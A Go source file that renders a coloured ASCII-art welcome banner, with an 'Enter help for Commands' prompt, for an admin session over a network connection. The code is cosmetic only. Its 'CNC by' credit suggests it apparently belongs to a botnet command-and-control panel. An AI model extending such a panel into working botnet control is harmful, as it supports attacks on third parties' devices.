package main

import (
	"net"
	"strings"
)

var defaultThemeTextGradient = []string{
	"\x1b[38;5;141m",
	"\x1b[38;5;135m",
	"\x1b[38;5;129m",
	"\x1b[38;5;93m",
	"\x1b[38;5;57m",
	"\x1b[38;5;56m",
	"\x1b[38;5;55m",
	"\x1b[38;5;54m",
	"\x1b[38;5;53m",
}

func defaultThemeGradientText(s string) string {
	var out strings.Builder
	out.Grow(len(s) * 2)

	colorIndex := 0
	for _, ch := range s {
		if ch == ' ' || ch == '\t' {
			out.WriteRune(ch)
			continue
		}

		out.WriteString(defaultThemeTextGradient[colorIndex%len(defaultThemeTextGradient)])
		out.WriteRune(ch)
		out.WriteString(ansiReset)
		colorIndex++
	}

	return out.String()
}

func writeDefaultAdminHeader(conn net.Conn, user *User) {
	username := "user"
	if user != nil && strings.TrimSpace(user.Username) != "" {
		username = user.Username
	}

	banner := []string{
		"",
		"                       (`.-,')",
		"                     .-'     ;",
		"                 _.-'   , `,-",
		"           _ _.-'     .'  /._",
		"         .' `  _.-.  /  ,'._;)",
		"        (       .  )-| (",
		"         )`,_ ,'_,'  \\_;)",
		" ('_  _,'.'  (___,))",
		"  `-:;.-'",
	}

	gradient := []string{
		"\x1b[38;5;141m",
		"\x1b[38;5;135m",
		"\x1b[38;5;129m",
		"\x1b[38;5;93m",
		"\x1b[38;5;57m",
		"\x1b[38;5;56m",
		"\x1b[38;5;55m",
		"\x1b[38;5;54m",
		"\x1b[38;5;53m",
	}

	rightText := []string{
		defaultThemeGradientText("Hi") + " " + ansiCommands + username + ansiReset,
		defaultThemeGradientText("Enter") + " " + ansiCommands + "'help'" + ansiReset + " " + defaultThemeGradientText("(to see all)") + " " + ansiCommands + "Commands!" + ansiReset,
		defaultThemeGradientText("(CNC by)") + " " + ansiCommands + "@ch3rry_nvme" + ansiReset,
	}

	maxRightWidth := 0
	for _, line := range rightText {
		visible := len(stripANSICodes(line))
		if visible > maxRightWidth {
			maxRightWidth = visible
		}
	}
	for i, line := range rightText {
		visible := len(stripANSICodes(line))
		if visible < maxRightWidth {
			pad := (maxRightWidth - visible) / 2
			if pad > 0 {
				rightText[i] = strings.Repeat(" ", pad) + line
			}
		}
	}

	catWidth := 0
	for _, line := range banner {
		if len(line) > catWidth {
			catWidth = len(line)
		}
	}

	startRight := (len(banner) - len(rightText)) / 2
	spacer := "   "
	for i := 0; i < len(banner); i++ {
		left := banner[i]
		if len(left) < catWidth {
			left = left + strings.Repeat(" ", catWidth-len(left))
		}
		color := gradient[i%len(gradient)]
		right := ""
		if i >= startRight && i < startRight+len(rightText) {
			right = rightText[i-startRight]
		}
		conn.Write([]byte(color + left + ansiReset + spacer + right + "\r\n"))
	}
	conn.Write([]byte("\r\n"))
}
